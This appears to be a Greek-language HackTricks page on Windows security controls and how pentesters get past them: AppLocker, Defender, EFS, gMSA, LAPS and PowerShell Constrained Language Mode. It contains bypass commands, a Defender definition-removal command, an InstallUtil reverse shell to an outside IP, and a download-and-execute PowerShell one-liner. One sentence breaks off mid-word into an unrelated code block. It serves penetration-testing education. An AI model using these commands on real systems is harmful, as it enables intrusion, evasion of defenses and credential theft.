# Windows Security Controls

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Πολιτική AppLocker

Ένας λευκός κατάλογος εφαρμογών είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατεύσει το περιβάλλον από επιβλαβή κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν συμμορφώνεται με τις συγκεκριμένες επιχειρηματικές ανάγκες μιας οργάνωσης.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η λύση της Microsoft για τον **λευκό κατάλογο εφαρμογών** και δίνει στους διαχειριστές συστημάτων έλεγχο επί **ποιες εφαρμογές και αρχεία μπορούν να εκτελέσουν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** επί εκτελέσιμων, σεναρίων, αρχείων εγκατάστασης Windows, DLLs, εφαρμογών πακεταρίσματος και εγκαταστάτες πακεταρίσματος εφαρμογών.\
Συνήθως οι οργανισμοί **αποκλείουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε συγκεκριμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις είναι στη μαύρη λίστα/λευκή λίστα:

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Αυτή η διαδρομή καταχώρισης περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο για να ελέγξετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Παράκαμψη

* Χρήσιμοι **Φάκελοι εγγραφής** για παράκαμψη της πολιτικής του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **φάκελοι εγγραφής** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* Συχνά **εμπιστευόμενα** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικά αρχεία μπορούν να είναι χρήσιμα για να παρακάμψουν το AppLocker.
* **Κακά γραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
* Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε ένα **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
* Οι οργανισμοί επικεντρώνονται συχνά στο **φραγμό του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τα **άλλα** [**τοποθεσίες εκτελέσιμων αρχείων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
* Η **επιβολή DLL σπανίως ενεργοποιείται** λόγω του επιπρόσθετου φορτίου που μπορεί να ασκήσει σε ένα σύστημα και της ποσότητας των δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα χαλάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτα θα βοηθήσει στην παράκαμψη του AppLocker**.
* Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες ελέγξτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Αποθήκευση Διαπιστευτηρίων

### Διαχειριστής Ασφαλείας (SAM)

Τα τοπικά διαπιστευτήρια είναι παρόντα σε αυτό το αρχείο, οι κωδικοί πρόσβασης είναι κατακερματισμένοι.

### Αρχή Τοπικής Αρχής Ασφαλείας (LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\
Το **LSA** διοικεί την τοπική **πολιτική ασφαλείας** (πολιτική κωδικού πρόσβασης, δικαιώματα χρηστών...), **πιστοποίηση**, **διακριτικά πρόσβασης**...\
Το LSA θα είναι αυτό που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για τοπική σύνδεση) και θα **επικοινωνήσει** με τον **ελεγκτή τομέα** για την πιστοποίηση ενός χρήστη τομέα.

Τα **διαπιστευτήρια** **αποθηκεύονται** μέσα στη διεργασία **LSASS**: εισιτήρια Kerberos, κατακερματισμένα NT και LM, κωδικοί πρόσβασης που μπορούν να αποκρυπτογραφηθούν εύκολα.

### Μυστικά LSA

Το LSA μπορεί να αποθηκεύσει στο δίσκο ορισμένα διαπιστευτήρια:

* Κωδικό πρόσβασης του λογαριασμού υπολογιστή του Active Directory (απροσπέλαστος ελεγκτής τομέα).
* Κωδικοί των λογαριασμών των υπηρεσιών των Windows
* Κωδικοί για προγραμματισμένες εργασίες
* Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Είναι παρούσα μόνο στους ελεγκτές τομέα.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) είναι ένα Αντιιό που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις των Windows Server. Αυτό **φράζει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε τη **κατάσταση** του **Defender** μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να μάθετε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το απαριθμήσετε μπορείτε επίσης να εκτελέσετε:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Το EFS ασφαλίζει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στην εναλλακτική ροή δεδομένων $EFS του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφήσει το FEK από τη ροή $EFS. Περισσότερες λεπτομέρειες μπορούν να βρεθούν [εδώ](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Οι **σενάριο αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:

* Όταν αρχεία ή φάκελοι μεταφέρονται σε ένα μη σύστημα αρχείων EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), αποκρυπτογραφονται αυτόματα.
* Τα κρυπτογραφημένα αρχεία που στέλνονται μέσω του πρωτοκόλλου SMB/CIFS διακρυπτογραφονται πριν τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει τη **διαφανή πρόσβαση** στα κρυπτογραφημένα αρχεία για τον ιδιοκτήτη. Ωστόσο, η απλή αλλαγή του κωδικού του ιδιοκτήτη και η σύνδεση δεν θα επιτρέψει την αποκρυπτογράφηση.

**Σημεία Κλειδιά**:

* Το EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
* Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για να αποκτήσει πρόσβαση στο FEK.
* Η αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
* Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα από τον ιδιοκτήτη χωρίς επιπλέον βήματα.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτήν την **υπηρεσία** ελέγχοντας αν αυτή η διαδρομή υπάρχει: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας την εντολή cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε τις εντολές `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Είστε Αρχή Συστήματος

Αυτός ο τρόπος απαιτεί τον **χρήστη θύμα** να εκτελεί ένα **διαδικασία** μέσα στον υπολογιστή. Σε αυτήν την περίπτωση, χρησιμοποιώντας μια συνεδρία `meterpreter`, μπορείτε να υποκαταστήσετε το διακριτικό της διαδικασίας του χρήστη (`impersonate_token` από `incognito`). Ή μπορείτε απλά να `μετακινηθείτε` στη διαδικασία του χρήστη.

#### Γνωρίζοντας τον κωδικό του χρήστη

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Διαχειριζόμενοι Λογαριασμοί Ομάδας Υπηρεσιών (gMSA)

Η Microsoft ανέπτυξε τους **Διαχειριζόμενους Λογαριασμούς Ομάδας Υπηρεσιών (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Αντίθετα με τους παραδοσιακούς λογαριασμούς υπηρεσιών που συχνά έχουν ενεργοποιημένη τη ρύθμιση "**Ο κωδικός ποτέ δεν λήγει**", οι gMSAs προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

* **Αυτόματη Διαχείριση Κωδικών**: Οι gMSAs χρησιμοποιούν έναν πολύπλοκο κωδικό 240 χαρακτήρων που αλλάζει αυτόματα σύμφωνα με την πολιτική του τομέα ή του υπολογιστή. Αυτή η διαδικασία χειρίζεται από την Υπηρεσία Διανομής Κλειδιών (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών.
* **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί στα κλειδώματα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
* **Υποστήριξη Πολλαπλών Χώρων**: Οι gMSAs μπορούν να χρησιμοποιούνται σε πολλούς υπολογιστές, κάνοντάς τους ιδανικούς για υπηρεσίες που τρέχουν σε πολλούς διακομιστές.
* **Δυνατότητα Προγραμματισμένων Εργασιών**: Αντίθετα με τους διαχειριζόμενους λογαριασμούς υπηρεσιών, οι gMSAs υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
* **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Όνομα Κύριας Υπηρεσίας (SPN) όταν υπάρχουν αλλαγές στις λεπτομέρειες του sAMaccount του υπολογιστή ή στο όνομα DNS, απλοποιώντας τη διαχείριση του SPN.

Οι κωδικοί για τους gMSAs αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και αλλάζουν αυτόματα κάθε 30 ημέρες από τους ελεγκτές τομέα (DCs). Αυτός ο κωδικός, ένα κρυπτογραφημένο δεδομένο γνωστό ως [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένοι οι gMSAs, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως η LDAPS, ή η σύνδεση πρέπει να είναι πιστοποιημένη με 'Σφράγιση & Ασφάλεια'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Μπορείτε να διαβάσετε αυτόν τον κωδικό με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια επίθεση **NTLM relay** για να **διαβάσετε** το **password** του **gMSA**.

## LAPS

Η **Λύση Τοπικού Διαχειριστή Κωδικού (LAPS)**, διαθέσιμη για λήψη από την [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών τοπικού Διαχειριστή. Αυτοί οι κωδικοί, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με τη χορήγηση επαρκών δικαιωμάτων, παρέχεται η δυνατότητα ανάγνωσης των κωδικών τοπικού διαχειριστή.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## Λειτουργία Περιορισμένης Γλώσσας PowerShell

Η [**Λειτουργία Περιορισμένης Γλώσσας PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **κλειδώνει πολλές από τις λειτουργίες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως ο περιορισμός αντικειμένων COM, η επιτροπή μόνο εγκεκριμένων τύπων .NET, οι ροές εργασίας βασισμένες σε XAML, οι κλάσεις PowerShell και άλλα.

### **Έλεγχος**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Διασχίζοντας

```powershell
#Easy bypass
Powershell -version 2
```

Στα τρέχοντα Windows το Bypass δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωτίσετε, μπορεί να χρειαστεί** **να** _**Προσθέσετε μια Αναφορά**_ -> _Περιήγηση_ ->_Περιήγηση_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το έργο σε .Net4.5**.

#### Άμεσο παράκαμψη:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Αντίστροφη κέλυφωση:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να \*\*εκτελέσετε κ

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

## Διεπαφή Παροχής Υποστήριξης Ασφάλειας (SSPI)

Είναι η API που μπορεί να χρησιμοποιηθεί για την ταυτοποίηση των χρηστών.

Η SSPI θα είναι υπεύθυνη για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι το Kerberos. Στη συνέχεια, η SSPI θα διαπραγματευτεί ποιο πρωτόκολλο ταυτοποίησης θα χρησιμοποιηθεί. Αυτά τα πρωτόκολλα ταυτοποίησης ονομάζονται Πάροχοι Υποστήριξης Ασφάλειας (SSP), βρίσκονται μέσα σε κάθε μηχάνημα Windows σε μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν τον ίδιο προκειμένου να μπορούν να επικοινωνήσουν.

### Κύριοι Πάροχοι Υποστήριξης Ασφάλειας (SSP)

* **Kerberos**: Ο προτιμώμενος
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Διακομιστές ιστού και LDAP, κωδικός πρόσβασης σε μορφή κατακερματισμένου MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL και TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του πρωτοκόλλου που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
* %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.

## UAC - Έλεγχος Λογαριασμού Χρήστη

[Έλεγχος Λογαριασμού Χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί ένα **παράθυρο συγκατάθεσης για υψηλές δραστηριότητες**.
